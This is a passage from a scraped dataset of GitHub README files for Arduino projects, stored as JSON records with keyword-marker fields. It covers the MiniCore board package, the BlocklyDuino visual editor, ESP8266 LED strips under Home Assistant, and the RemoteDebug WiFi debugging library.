arduino ide version 1.6.4 or greater.\nopen the arduino ide.\nopen the file > preferences menu item.\nenter the following url in additional boards manager urls:\nhttps://mcudude.github.io/minicore/package_mcudude_minicore_index.json\nopen the tools > board > boards manager... menu item.\nwait for the platform indexes to finish downloading.\nscroll down until you see the minicore entry and click on it.\nclick install.\nafter installation is complete close the boards manager window.\nnote: if you plan to use the *pb series, you need the latest version of the arduino toolchain. this toolchain is available through ide 1.8.6 or newer. here's how you install/enable the toolchain:\nopen the tools > board > boards manager... menu item.\nwait for the platform indexes to finish downloading.\nthe top is named arduino avr boards. click on this item.\nmake sure the latest version is installed and selected\nclose the boards manager window.\nmanual installation\nclick on the \"download zip\" button in the upper right corner. exctract the zip file, and move the extracted folder to the location \"~/documents/arduino/hardware\". create the \"hardware\" folder if it doesn't exist. open arduino ide, and a new category in the boards menu called \"minicore\" will show up.\nplatformio\nplatformio is an open source ecosystem for iot development and supports minicore.\n*see platformio.md for more information.\ngetting started with minicore\nok, so you're downloaded and installed minicore, but how to get started? here's a quick guide:\nhook up your microcontroller as shown in the pinout diagram, or simply just plut it into an arduino uno board.\n(if you're not planning to use the bootloader (uploading code using a usb to serial adapter), the ftdi header and the 100 nf capacitor on the reset pin can be omitted.)\nopen the tools > board menu item, and select a minicore compatible microcontroller.\nif the bod option is presented, you can select at what voltage the microcontroller will shut down at. read more about bod here.\nselect your prefered clock frequency. 16 mhz is standard on most arduino boards, including the arduino uno.\nselect what kind of programmer you're using under the programmers menu.\nif the variants option is presented, you'll have to specify what version of the microcontroller you're using. e.g the atmega328 and the atmega328p got different device signatures, so selecting the wrong one will result in an error.\nhit burn bootloader. if an led is connected to pin pb5 (arduino pin 13), it should flash twice every second.\nnow that the correct fuse settings is sat and the bootloader burnt, you can upload your code in two ways:\ndisconnect your programmer -----> tool !!! , and connect a usb to serial adapter to the microcontroller, like shown in the minimal setup circuit. then select the correct serial port under the tools menu, and click the upload button. if you're getting some kind of timeout error, it means your rx and tx pins are swapped, or your auto reset circuity isn't working properly (the 100 nf capacitor on the reset line).\nkeep your programmer connected, and hold down the shift button while clicking upload. this will erase the bootloader and upload your code using the programmer tool.\nyour code should now be running on your microcontroller! if you experience any issues related to bootloader burning or serial uploading, please use this forum post or create an issue on github.\nwiring reference\nto extend this core's functionality a bit futher, i've added a few missing wiring functions. as many of you know arduino is based on wiring, but that doesn't mean the wiring development isn't active. these functions are used as \"regular\" arduino functions, and there's no need to include an external library.\ni hope you find this useful, because they really are!\nfunction list\nportmode()\nportread()\nportwrite()\nsleepmode()\nsleep()\nnosleep()\nenablepower()\ndisablepower()\nfor further information please view the wiring reference page!\npinout\nthis core uses the standard arduino uno pinout and will not break compatibility of any existing code or libraries. what's different about this pinout compared to the original one is that this got three aditinal io pins available. you can use digital pin 20 and 21 (pb6 and pb7) as regular io pins if you're ussing the internal oscillator instead of an external crystal. if you're willing to disable the reset pin (can be enabled using high voltage parallel programming) it can be used as a regular io pin, and is assigned to digital pin 22 (pc6). click to enlarge:\ndip-28 package atmega8/48/88/168/328 tqfp-32 smd package atmega8/48/88/168/328 tqfp-32 smd package atmega48/88/168/328pb\nminimal setup\nhere is a simple schematic showing a minimal setup using an external crystal. skip the crystal and the two 22pf capacitors if you're using the internal oscillator. if you don't want to mess with breadboards, components and wiring; simply use your arduino uno! click to enlarge:\ndip-28 package atmega8/48/88/168/328 tqfp-32 smd package atmega8/48/88/168/328 tqfp-32 smd package atmega48/88/168/328pb", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000072, "year": null}, {"Unnamed: 0": 2124, "autor": 84, "date": null, "content": "Welcome to BlocklyDuino\nCheck BlockDuino v2\nBlocklyDuino is a web-based visual programming editor for Arduino.\nBlocklyDuino is based on Blockly, the web-based, graphical programming editor. Provide static type language blocks and code generators for Arduino programming.\nBlocklyDuino also support Grove blocks to easily get started with microcontroller-based experimentation and learning.\nFeatures\nProgramming Arduino with visually drag and drop code blocks\nGenerate fully compatible Arduino source code\nInteractive Arduino board with 10+ predefined Grove sensor blocks\nLoad different on-site examples with url parameters\nDemo\nBlocklyDuino is a web tool. You can give it a try at Web to see the working BlocklyDuino.\nYou can link directly to examples\ndemo 1 make default LED blink\ndemo 2 control servo with potentio rotator\ndemo 3 click button to change LED colors\nOr watch the video demos\nRun locally on your web browser\nIf you want to install it locally. Get code from github and open blockly/apps/blocklyduino/index.html in your browser.\nThe preffered way is to put the BlocklyDuino/web folder into a web server and open the url like localhost/public/blockly/apps/blocklyduino/index.html for use.\nIntegrated Arduino upload\nTo avoid the tedious step of manually pasting code to the Arduino IDE, you can run a mini webserver that uses the Arduino IDE to upload the code to a connected Arduino board on Windows, Mac OS X and Linux systems. Invoke this command from the BlocklyDuino root folder:\npython arduino_web_server.py\nYou can optionally specify the port with --port=COM3 (or --port=/dev/tty.foo on Linux and Mac); if you don't, it will try and guess which port to use.\nWhen the webserver is running, you can access BlocklyDuino itself on http://127.0.0.1:8080/.\nUsage\nOpen browser to BlocklyDuino, drag and drop blocks to make an Arduino program\nSelect the Arduino tab and copy all of the source code into an existing or new project in the Arduino IDE\nPress the Upload button in the Arduino IDE to burn the code into a connected Arduino board\nOR (if running arduino_web_server.py):\nOpen browser to BlocklyDuino, drag and drop blocks to make an Arduino program.\nSelect the Arduino tab and press the Upload button. (press the Reset button to upload an empty program)\nIn GNU/Linux OS (i.e. Ubuntu 18.04x64)\nOpen one terminal, go the BlocklyDuino path and run:\npython arduino_web_server.py --port=/dev/ttyUSB0\nOpen a new terminal and run:\nfirefox http://127.0.0.1:8080/\nOnce BlocklyDuino is open in the browser, drag and drop blocks to make an Arduino program or load an example by clicking on LoadXML (e.g. /blocky/apps/blockyduino/examples/blink.xml or other in the same path)\nPress Upload and wait until you see Program uploaded ok and press OK!\nClose terminals with Ctrl+c or Ctrl+d\nChangeLog\nCheck changelog here\nAuthors and Contributors\nFred Lin (@gasolin).\nThanks Neil Fraser, Q.Neutron from Blockly https://developers.google.com/blockly/ Thanks Dale Low (gumbypp) for contribute the python server to pipe BlocklyDuino source to arduino board. Thanks Arduino and Seeeduino guys for Arduino and Grove blocks.\nThe project is also inspired by arduiblock and modkit\nLicense\nCopyright (C) 2012~2015 Fred Lin gasolin+blockly@gmail.com\nLicensed under the Apache License, Version 2.0 (the \"License\");\nyou may not use this file except in compliance with the License.\nYou may obtain a copy of the License at\nhttp://www.apache.org/licenses/LICENSE-2.0", "link": "https://github.com/BlocklyDuino/BlocklyDuino", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "welcome to blocklyduino\ncheck blockduino v2\nblocklyduino is a web-based visual programming editor for arduino.\nblocklyduino is based on blockly, the web-based, graphical programming editor. provide static type language blocks and code generators for arduino programming.\nblocklyduino also support grove blocks to easily get started with microcontroller-based experimentation and learning.\nfeatures\nprogramming arduino with visually drag and drop code blocks\ngenerate fully compatible arduino source code\ninteractive arduino board with 10+ predefined grove sensor blocks\nload different on-site examples with url parameters\ndemo\nblocklyduino is a web -----> tool !!! . you can give it a try at web to see the working blocklyduino.\nyou can link directly to examples\ndemo 1 make default led blink\ndemo 2 control servo with potentio rotator\ndemo 3 click button to change led colors\nor watch the video demos\nrun locally on your web browser\nif you want to install it locally. get code from github and open blockly/apps/blocklyduino/index.html in your browser.\nthe preffered way is to put the blocklyduino/web folder into a web server and open the url like localhost/public/blockly/apps/blocklyduino/index.html for use.\nintegrated arduino upload\nto avoid the tedious step of manually pasting code to the arduino ide, you can run a mini webserver that uses the arduino ide to upload the code to a connected arduino board on windows, mac os x and linux systems. invoke this command from the blocklyduino root folder:\npython arduino_web_server.py\nyou can optionally specify the port with --port=com3 (or --port=/dev/tty.foo on linux and mac); if you don't, it will try and guess which port to use.\nwhen the webserver is running, you can access blocklyduino itself on http://127.0.0.1:8080/.\nusage\nopen browser to blocklyduino, drag and drop blocks to make an arduino program\nselect the arduino tab and copy all of the source code into an existing or new project in the arduino ide\npress the upload button in the arduino ide to burn the code into a connected arduino board\nor (if running arduino_web_server.py):\nopen browser to blocklyduino, drag and drop blocks to make an arduino program.\nselect the arduino tab and press the upload button. (press the reset button to upload an empty program)\nin gnu/linux os (i.e. ubuntu 18.04x64)\nopen one terminal, go the blocklyduino path and run:\npython arduino_web_server.py --port=/dev/ttyusb0\nopen a new terminal and run:\nfirefox http://127.0.0.1:8080/\nonce blocklyduino is open in the browser, drag and drop blocks to make an arduino program or load an example by clicking on loadxml (e.g. /blocky/apps/blockyduino/examples/blink.xml or other in the same path)\npress upload and wait until you see program uploaded ok and press ok!\nclose terminals with ctrl+c or ctrl+d\nchangelog\ncheck changelog here\nauthors and contributors\nfred lin (@gasolin).\nthanks neil fraser, q.neutron from blockly https://developers.google.com/blockly/ thanks dale low (gumbypp) for contribute the python server to pipe blocklyduino source to arduino board. thanks arduino and seeeduino guys for arduino and grove blocks.\nthe project is also inspired by arduiblock and modkit\nlicense\ncopyright (c) 2012~2015 fred lin gasolin+blockly@gmail.com\nlicensed under the apache license, version 2.0 (the \"license\");\nyou may not use this file except in compliance with the license.\nyou may obtain a copy of the license at\nhttp://www.apache.org/licenses/license-2.0", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000084, "year": null}, {"Unnamed: 0": 2132, "autor": 92, "date": null, "content": "ESP MQTT JSON Digital LEDs\nThis project shows a super easy way to get started using Digital LED strips with Home Assistant, a sick, open-source Home Automation platform that can do just about anything.\nThe code covered in this repository utilizes Home Assistant's MQTT JSON Light Component and an ESP8266 microcontroller.\nSupported Features Include\nRGB Color Selection\nBrightness\nFlash\nFade\nTransitions\nEffects with Animation Speed\nOver-the-Air (OTA) Upload from the ArduinoIDE!\nSome of the effects incorporate the currrently selected color (sinelon, confetti, juggle, etc) while other effects use pre-defined colors. You can also select custom transition speeds between colors. The transition variable in Home Assistant (HA) also functions to control the animation speed of the currently running animation. The input_slider and automation in the HA configuration example allow you to easily set a transition speed from HA's user interface without needing to use the Services tool.\nThe default speed for the effects is hard coded and is set when the light is first turned on. When changing between effects, the previously used transition speed will take over. If the effects don't look great, play around with the slider to adjust the transition speed (AKA the effect's animation speed).\nOTA Uploading\nThis code also supports remote uploading to the ESP8266 using Arduino's OTA library. To utilize this, you'll need to first upload the sketch using the traditional USB method. However, if you need to update your code after that, your WIFI-connected ESP chip should show up as an option under Tools -> Port -> Porch at your.ip.address.xxx. More information on OTA uploading can be found here. Note: You cannot access the serial monitor over WIFI at this point.\nDemo Video\nTutorial Video\nParts List\nDigital RGB Leds\nNodeMCU\nAluminum Mounting Channel/Diffuser\n12v to 5v Step Down\n12V 15amp Power Supply\nStrip Connector\nLogic Level Shifter\n20 Gauge Wire\nCable Chase\nProject Box\nHeader Wires\nPower Jacks\nWiring Diagram\nHome Assistant Service Examples\nBesides using the card in Home Assistant's user interface, you can also use the Services tool to control the light using the light.turn_on and light.turn_off services. This will let you play with the parameters you can call later in automations or scripts.\nFade the Light On Over 5 Seconds - light.turn_on\n{\"entity_id\":\"light.porch_strip\",\n\"brightness\":150,\n\"color_name\":\"blue\",\n\"transition\":\"5\"\n}\nFlash The Light - light.turn_on\n{\"entity_id\":\"light.porch_strip\",\n\"color_name\":\"green\",\n\"brightness\":255,\n\"flash\":\"short\"\n}\nCall Rainbow Effect with Slow Animation Speed - light.turn_on\n{\"entity_id\":\"light.porch_strip\",\n\"transition\":\"50\",\n\"brightness\":255,\n\"effect\":\"rainbow\"\n}\nFade the Light Off Over 5 Seconds - light.turn_off\n{\"entity_id\":\"light.porch_strip\",\n\"transition\":\"50\"\n}", "link": "https://github.com/bruhautomation/ESP-MQTT-JSON-Digital-LEDs", "origin": "Github", "suborigin": "arduino", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "esp mqtt json digital leds\nthis project shows a super easy way to get started using digital led strips with home assistant, a sick, open-source home automation platform that can do just about anything.\nthe code covered in this repository utilizes home assistant's mqtt json light component and an esp8266 microcontroller.\nsupported features include\nrgb color selection\nbrightness\nflash\nfade\ntransitions\neffects with animation speed\nover-the-air (ota) upload from the arduinoide!\nsome of the effects incorporate the currrently selected color (sinelon, confetti, juggle, etc) while other effects use pre-defined colors. you can also select custom transition speeds between colors. the transition variable in home assistant (ha) also functions to control the animation speed of the currently running animation. the input_slider and automation in the ha configuration example allow you to easily set a transition speed from ha's user interface without needing to use the services -----> tool !!! .\nthe default speed for the effects is hard coded and is set when the light is first turned on. when changing between effects, the previously used transition speed will take over. if the effects don't look great, play around with the slider to adjust the transition speed (aka the effect's animation speed).\nota uploading\nthis code also supports remote uploading to the esp8266 using arduino's ota library. to utilize this, you'll need to first upload the sketch using the traditional usb method. however, if you need to update your code after that, your wifi-connected esp chip should show up as an option under tools -> port -> porch at your.ip.address.xxx. more information on ota uploading can be found here. note: you cannot access the serial monitor over wifi at this point.\ndemo video\ntutorial video\nparts list\ndigital rgb leds\nnodemcu\naluminum mounting channel/diffuser\n12v to 5v step down\n12v 15amp power supply\nstrip connector\nlogic level shifter\n20 gauge wire\ncable chase\nproject box\nheader wires\npower jacks\nwiring diagram\nhome assistant service examples\nbesides using the card in home assistant's user interface, you can also use the services tool to control the light using the light.turn_on and light.turn_off services. this will let you play with the parameters you can call later in automations or scripts.\nfade the light on over 5 seconds - light.turn_on\n{\"entity_id\":\"light.porch_strip\",\n\"brightness\":150,\n\"color_name\":\"blue\",\n\"transition\":\"5\"\n}\nflash the light - light.turn_on\n{\"entity_id\":\"light.porch_strip\",\n\"color_name\":\"green\",\n\"brightness\":255,\n\"flash\":\"short\"\n}\ncall rainbow effect with slow animation speed - light.turn_on\n{\"entity_id\":\"light.porch_strip\",\n\"transition\":\"50\",\n\"brightness\":255,\n\"effect\":\"rainbow\"\n}\nfade the light off over 5 seconds - light.turn_off\n{\"entity_id\":\"light.porch_strip\",\n\"transition\":\"50\"\n}", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000092, "year": null}, {"Unnamed: 0": 2133, "autor": 93, "date": null, "content": "RemoteDebug Library\nA library for Arduino to debug projects over WiFi, with web app or telnet client, with Print commands like Serial Monitor.\nA library to remotely debug over a WiFi connection by telnet or web browser\nRemoteDebug setup a TCP/IP server, that you connect to debugging, as an alternative to the serial connection\nContents\nAbout\nHow it looks\nGithub\nNews\nBenefits\nHTML5 web app\nTelnet client\nWishlist\nInstall\nUsing\nKnown issues\nReleases\nThanks\nAbout\nBy default the Arduino only has as debug possibility via the Serial port. This has a few disadvantages:\nrequires a physical cable to the Arduino device (if the device is far away or in a remote location this is not easy)\ndebugging multiple Arduinos at the same time requires many serial ports and a lot of cables\nWith the ESP8266 (NodeMCU) or ESP32 we now have network connectivity (WiFi) which can be used for streaming debugging information in real-time.\nThis library is good for IoT projects, home automation, mobile robots (can debug it in moviment with a cable ?) or another WiFi projects.\nIn fact, this library was born of a need to debug an IoT project of home automation. In this project there was a central module and three auxiliary modules, and these were far from each other. One was hard to reach, under the roof of the house. To debug this project, accompanying the exchange of messages in realtime, is impossible to do with traditional way, by USB cable.\nThe MiP_ESP8266_Library and my ESP32 WiFi robot are example of projects that uses RemoteDebug. See it in: MiP_ESP8266_Library and ESPlorer_v1\nRemoteDebug is improved with client buffering (is last send is <= 10ms), to avoid mysterious delays of WiFi networking on ESP32 and ESP8266 boards\nNote: If your project not use WiFi, you can use my another library, the SerialDebug library, this library works with any Arduino board.\nNote II: RemoteDebug library is now only to Espressif boards, as ESP32 and ESP8266, If need for another WiFi boards, please add an issue about this and we will see if it is possible made the port for your board.\nHow it looks\nImage: In RemoteDebugApp (web app)\nImage: In telnet client\nYoutube (RemoteDebug v2):\nYoutube (3 telnet connections with RemoteDebug) v1:\nGithub\nContribute to this library development by creating an account on GitHub.\nPlease give a star, if you find this library useful, this help an another people, discover it too.\nPlease add an issue for problems or suggestion.\nNews\nRemoteDebugApp Beta\nNow have another repository, RemoteDebugApp It is for local copy of web app in internet. It is updated with lastest version of web app, after it is publised in web server: http://joaolopesf.net/remotedebugapp. Download it, for use when internet is offline. As it is a local copy, the app will check for new versions periodically.\nAn HTML5 web app to use for debugging in web browser, instead telnet client, that uses web socket to comunicate.\nNow RemoteDebug v3 have a web socket server too, to support the RemoteDebugApp connection.\nRemoteDebugApp is in beta, if you have any problems or suggestions, please add issue about this.\nThe telnet connection remains, to any want this, or to internet offline uses.\nVersion 2.1.1\nNow RemoteDebug have a code converter, for help you to convert your codes: to do it, please access the RemoteDebugConverter\nVersion 2.0.0\nNow RemoteDebug can have the same simple software debugger, that SerialDebug library have. This is done, installing another library, the RemoteDebugger The RemoteDebugger act as an add on to RemoteDebug. To support this addon, the changes in RemoteDebug, is minimum, just a few callbacks It is done to no add extra overhead to projects that no need an debugger. To more informations please access the RemoteDebugger github repository.\nNow RemoteDebug have a new color system, using more colors, as done in SerialDebugApp\nNote: due the RemoteDebug library, is migrate to Arduino 1.5 format, with folder \"src\", please delete and reinstall the library to avoid duplication of RemoteDebug sources files.\nVersion 1.5.*\nIn 1.5.0 version, we have debug* and rdebug* macros (see below), that put automatically, the name of function that called, and core id (core id is only for ESP32)\nBenefits\nSerialDebug is better than Arduino default debugging by Serial.print commands:\nThis is more optimized\nBeing or not debugging via USB cable, the Serial.print command allways is processed, waste CPU time on microcontroller. In other words, the debug commands are processed, with someone connected in the serial or not.\nWith RemoteDebug, all debug output is processed only if exists anyone debugging via telnet or web app connection.\nAnd with the debug levels of resource, the volume displayed of messages are reduced for higher levels. For example, only process all messages, if the level is the lowest, the verbose,\nRemoteDebug is otimized to reduce overheads, in CPU and memory and include client buffering feature.\nHave debug levels\nDuring the development, we can put a lot of debug messages...\nBut with RemoteDebug, we can put a level in each one.\nFor all messages (except levels always (debugA) or error (debugE), the message only is processed and showed, if debug level is equal or higher than it level\nRemoteDebug have 6 debug levels, in order of priority:\nAlway showed:\nError: Critical errors\nAlways: Important messages\nAnother levels (showed if level is equal or higher that actual one):\nWarning: Error conditions but not critical\nInfo: Information messages\nDebug: Extra information\nVerbose: More information than the usual\nSo We can change the level to verbose, to see all messages. Or to debug to see only debug or higher level, etc.\nIs very good to reduce a quantity of messages that a project can generate, to help debugging.\nIt is easy to migrate\nRemoteDebug have a converter to help migrate your Arduino codes, from Serial.prints to this library.\nRemoteDebugConverter\nEven if you want to do this manually, it's very simple. Please see topic Using above.\nHave auto function name and simple profiler\nA simple debug:\ndebugV(\"* Run time: %02u:%02u:%02u (VERBOSE)\", mRunHours, mRunMinutes, mRunSeconds);\nCan generate this output in serial monitor:\n(V p:3065 loop C1) * Run time: 00:41:23 (VERBOSE)\nWhere: V: is the level\np: is a profiler time, elased, between this and previous debug\nloop: is a function name, that executed this debug\nC1: is a core that executed this debug (and a function of this) (only for ESP32)\nThe remaining is the message formatted (printf)\nFor ESP32, the core id in each debug is very good to optimizer multicore programming.\nHave commands to execute from telnet or web app\nFor example:\nShow help (?)\nChange the level of debug (v,d,i,w,e), to show less or more messages.\nSee memory (m)\nReset the board (reset)\nSee about RemoteDebug commands below.\nYou can add your own commands, see the examples please\nIf your project have RemoteDebugger installed, have a new commands, e.g. call a function, see/change variables, ...\nHave a simple software debugger\nNow RemoteDebug (version >= 2.0.0), have an simple software debuggger, based in codes of SerialDebug library.\nThis is another library, that act as an addon to RemoteDebug.\nPlease acess the RemoteDebugger repository to more informations: RemoteDebugger\nReady for production (release compiler)\nFor release your device, just uncomment DEBUG_DISABLED in your project\nDone this, and no more debug processing.\nAnd better for DEBUG_DISABLED, __RemoteDebug__ have ZERO overhead,\ndue is nothing of this is compiled.\nWeb app\nAs SerialDebug, now RemoteDebug (v3) have an app,the RemoteDebugApp, to debug in web browser.\nThis app is an HTM5 web app, with websocket to comunicate to Arduino board.\nFor it, RemoteDebug v3 have a web socket server (can be disabled). It used a local copy of arduinoWebSockets library, due it not in Arduino Library manager.\nAs a large web page on web server, the solution for Arduino is save it in a storage, like SPIFFS. But not have automatically updates new version in data saved this way, this SPIFFS data is good for a project but not for a library.\nDue it, this app not is stored and served by board, instead the app is in web: http://joaolopesf.net/remotedebugapp Note: this not uses SSL (https), due web server socket on Arduino, not supports SSL (wss). But after page load, all traffic is in local network, no data is exposed on internet.\nThe RemoteDebugApp is a modern HTML5 and needs a modern browsers to work. Internet Explorer 11 and Safari 10 are an examples that not supported. But you can use anothers, as Chrome, Edge, Firefox.\nThe web app is in beta, please add an issue, for problems or suggestions.\nNow have another repository, RemoteDebugApp It is for local copy of web app in internet. It is updated with lastest version of web app, after it is publised in web server: http://joaolopesf.net/remotedebugapp. Download it, for use when internet is offline. As it is a local copy, the app will check for new versions periodically, for you can download a new version.\nThe telnet remains work, for when want this, or for fails on web app.\nTelnet\nTelnet is a standard way of remotely connecting to a server and is supported on all operating systems (Windows, Mac, Linux...).\nMacOSx and Linux have a native telnet client.\nFor Windows, a typical telnet client is the Putty: putty .\nHave a good tool for mobiles: the Fing, please find it in your mobile store. Its show all devices in local network (WiFi), show ports opened and can execute the telnet client too (external App)\nRemoteDebug sets-up a telnet server which is listening to any telnet client that wants to connect. After connection, logging is streamed to the telnet client.\nRemoteDebug is very simple to use, after a few lines of initialization code, you can use the well-known \"print\" commands to stream your logging to the remote client.\nDebug levels\nRemoteDebug supports the filtering of logging based on debug levels:\nOnly show for it actual debug level:\nVerbose\nDebug\nInfo\nWarnings\nNote: These levels are in the order of most-logging -> least-logging.\nOr for always show (not depends of actual debug level):\nAny\nErrors\nNote: All debugs is processed and showed only if have a client connection.\nThe telnet client or web app can set the debug level by typing a few simple commands.\nProfiler\nRemoteDebug includes a simple profiler. It can be enabled by the connected client (telnet or web app) or the Arduino code itself.\nWhen enabled, it shows the time between 2 debug statements, using different colors depending on the elapsed time.\nA typical example would be to insert logging just before and after a function after which you can see how much the is spent in the function.\nLightweight\nRemoteDebug is designed to give minimal overhead (connected or not) and only process debugs,if there is a client (telnet or web app) connected.\nCustom commands\nRemoteDebug supports custom commands that can be entered in the client (telnet or web app). These trigger the execution of a custom function in the Arduino code. For example this can be used to send back a status on request of the client.\nDISCLAIMER\nThe current version of RemoteDebug does not yet include any encrypted authentication, only plain text and is intended only for development, not use in production/release.\nFuture versions, if is possible, will include a secure way for authentication and further testing to support production environments.\nWishlist\n- An app to RemoteDebug like SerialDebug have.\n- Http page to begin/stop the telnet server or websocket server.\n- Authentication as telnet support (kerberos, etc.) to support production environment\nInstall\nJust download or clone this repository.\nOr for Arduino IDE, you can use the library manager to install and update the library.\nFor install help, please click on this:\nFor another IDE, or not using the library manager of Arduino IDE, I suggest you use a Github Desktop app to clone,it help to keep updated.\nPlease open the projects in example folder, to see it working.\nUsage\nincludes\n#include \"RemoteDebug.h\" //https://github.com/JoaoLopesF/RemoteDebug\ninstance\nRemoteDebug Debug;\nsetup\nIn the setup function after WiFi initialization\n// Initialize the server (telnet or web socket) of RemoteDebug\nDebug.begin(HOST_NAME);\n// OR\nDebug.begin(HOST_NAME, startingDebugLevel);\n// Options\nDebug.setResetCmdEnabled(true); // Enable the reset command\n// Debug.showProfiler(true); // To show profiler - time between messages of Debug\nNote: to enable the debugger, by RemoteDebugger, please acess this github repository: RemoteDebugger\nIn the tail of loop function\n// Remote debug over WiFi\nDebug.handle();\n// Or\ndebugHandle(); // Equal to SerialDebug\nIn any place of you code:\n#ifndef DEBUG_DISABLED\nif (Debug.isActive(Debug.<level>)) {\nDebug.printf(\"bla bla bla: %d %s\", number, str); // OR\nDebug.printf(\"bla bla bla: %d %s\", number, str.c_str()); // Note: if type is String need c_str() // OR\nDebug.println(\"bla bla bla 2 ln\");\nDebug.printf(\"float: %f\\n\", value); // Not works in ESP8266 :-(\n// Note: to show floats with printf (ESP8266 only),\n// you can use my ArduinoUtil library -> https://github.com/JoaoLopesF/ArduinoUtil\nDebug.printf(\"float: %s\\n\", Util.formatFloat(value, 0, 5).c_str());\n}\n#endif\nNote: Using isActive, you need surround the code by DEBUG_DISABLE precompile condition, to avoid compile it for production/release\nOr short way (equal to SerialDebug) (prefered if only one debug at time):\ndebugA(\"This is a any (always showed) - var %d\", var);\ndebugV(\"This is a verbose - var %d\", var);\ndebugD(\"This is a debug - var %d\", var);\ndebugI(\"This is a information - var %d\", var);\ndebugW(\"This is a warning - var %d\", var);\ndebugE(\"This is a error - var %d\", var);\ndebugV(\"This is a println\");\nOr if your project uses several Serial.print commands to generate a single debug message for example:\nSerial.print(\"a = \");\nSerial.print(a);\nSerial.print(\" b = \");\nSerial.print(b);\nSerial.print(\" c = \");\nSerial.println(c);\ncan be use rdebug* macros:\nrdebugV(\"a = \");\nrdebugV(a);\nrdebugV(\" b = \");\nrdebugV(b);\nrdebugV(\" c = \");\nrdebugVln(c);\nNote: in future, I suggest that you migrate this to a single debug command:\ndebugV(a = %d b = %d c = %d\", a, b, c);\nAn example of use debug levels: (supposing the data is a lot of characters)\nif (Debug.isActive(Debug.VERBOSE)) { // Debug message long\nDebug.printf(\"routine: data received: %s\\n\", data.c_str()); // Note: if type is String need c_str()\n} else if (Debug.isActive(Debug.DEBUG)) { // Debug message short\nDebug.printf(\"routine: data received: %s ...\\n\", data.substring(0, 20).c_str()); // %.20s not working :-|\n}\nStarting at version 1.5.0, debug macros (debug* and rdebug*), automatically put the name of function that called the macro, and core id (core id only for ESP32).\nSo:\nvoid foo() {\nuint8_t var = 1;\ndebugV(\"this is a debug - var %u\", var);\n}\nIt will show in client (telnet or web app):\n(V p:^0000ms) (foo)(C1) this is a debug - var 1\nWhere:\nV -> verbose\np -> profiler time\n(foo) -> this is a function name that calls the debug macro\n(C1) -> It is running it Core 1 (only for ESP32)\nAn example of use debug with serial enabled\nUseful to see messages if setup or\nin cause the ESP8266/ESP32 is rebooting (client connection stop before received all messages)\nOnly for this purposes I suggest it\n// Setup after Debug.begin\nDebug.setSerialEnabled(true); // All messages too send to serial too, and can be see in serial monitor\nFor reduce overheads RemoteDebug is disconnect the client (telnet or web app), if it not active.\n- Please press enter or any key if you need keep the connection\n- The default is 5 minutes (You can change it in RemoteDebug.h)\n- You can use mDNS to register each node with different name, it helps to connect without know the IP.\nPlease not forget to use if clause with Debug.isActive (if not using debug macros)\n---> This is very important to reduce overheads and work of debug levels\nPlease see the samples, basic or advanced, to learn how to use\nIn advanced sample, I used WifiManager library, ArduinoOTA and mDNS, please see it.\nReleases\n3.0.5 - 2019-03-23\n- Ajustment on debugA macro, thanks @jetpax and @cmidgley to add this issue.\n3.0.4 - 2019-03-19\n- All public configurations (#defines) have moved to RemoteDebugCfg.h, to facilitate changes for anybody.\n- Changed examples, with warnings on change any #define in project,\nwith workarounds if it not work. (thanks to @22MarioZ for added this issue)\n3.0.3 - 2019-03-18\n- Adjustments if web socket is disabled\n3.0.2 - 2019-03-16\n- Adjustments in examples, added one for debugger\n3.0.1 - 2019-03-13\n- Adjustments in silente mode\n- Commands from RemoteDebugApp now is treated\n- Adjusts to RemoteDebugger support connection by web sockets\n3.0.0 - 2019-03-10\n- If not disabled, add a web socket server to comunicate with RemoteDebugApp (HTML5 web app)\n- The standard telnet still working, to debug with internet offline\n- Ajustment on debugA macro, thanks @jetpax to add this issue\n2.1.2 - 2019-03-08\n- Add empty rprint* macros, if debug is disabled\n2.1.1 - 2019-03-06\n- Create option DEBUG_DISABLE_AUTO_FUNC\n- Create macros to be used for code converter: rprint and rprintln\nRemoteDebug now have an code converters to help migrate codes\n2.1.0 - 2019-03-04\n- Create precompiler DEBUG_DISABLED to compile for production/release,\nequal that have in SerialDebug\n- Adjustments in examples\n2.0.1 - 2019-03-01\n- Adjustments for the debugger: it still disable until dbg command, equal to SerialDebug\n- The callback will to be called before print debug messages now\n- And only if debugger is enabled in RemoteDebugger (command dbg)\n- Changed handle debugger logic\n2.0.0 - 2019-02-28\n- Added support to RemoteDebug addon library: the RemoteDebugger, an simple software debugger, based on SerialDebug\n- New color system\n1.5.9 - 2019-02-18\n- Bug -> sometimes the command is process twice\n- Workaround -> check time\n1.5.8 - 2019-02-08\n- New macros to compatibility with SerialDebug (can use RemoteDebug or SerialDebug) thanks to @phrxmd\n1.5.7 - 2018-11-03\n- Fixed bug for MAX_TIME_INACTIVE, thanks to @achuchev to add this issue\n1.5.6 - 2018-10-19\n- Adjustments based on pull request from @jeroenst (to allow serial output with telnet password and setPassword method)\n1.5.5 - 2018-10-19\n- Serial output is now not allowed if telnet password is enabled\n- Few adjustments\n1.5.4 - 2018-10-05\n- Few adjustment in write logic\n1.5.3 - 2018-09-04\n- Serial output adjustments (due bug in password logic)\n1.5.2\n- Correct rdebug macro (thanks @stritti)\n1.5.1 - 2018-08-28\n- New silent mode (command s)\n1.5.0 - 2018-08=26\n- Auto function name and ESP32 core id for rdebug* macros\n- begin method have a option for port number\n- Few adjustments\n- Added new rdebug?ln to put auto new line\n1.4.0 - 2018-08-18\n- Simple text password request feature (disabled by default)\nNotes:\nIt is very simple feature, only text, no cryptography,\nand the password is echoed in screen (I not discovery yet how disable it)\ntelnet use advanced authentication (kerberos, etc.)\nSuch as now RemoteDebug is not for production (releases),\nthis kind of authentication will not be done now.\n1.3.1 - 2018-08-18\n- Adjustments in precompiler macros\n1.3.0 - 2018-08-17\n- Bug in write with latest ESP8266 SDK\n- Port number can be modified in project Arduino (.ino file)\n- Few adjustments as ESP32 includes\n1.2.2\n- Adjustments, as avoid ESP32 include errors\n- Telnet port of server can be modified by project\nJust put it in your .ino, before the include:\n1.2.0\n- Shortcuts and client buffering to avoid mysterious delay of ESP networking\n1.1.0\n- Adjustments and now runs in Esp32 too.\n1.0.0\n- Adjustments and improvements from Beta versions.\nNew features:\n- Filter\n- Colors\n- Support to Windows telnet client\n0.9\n- First 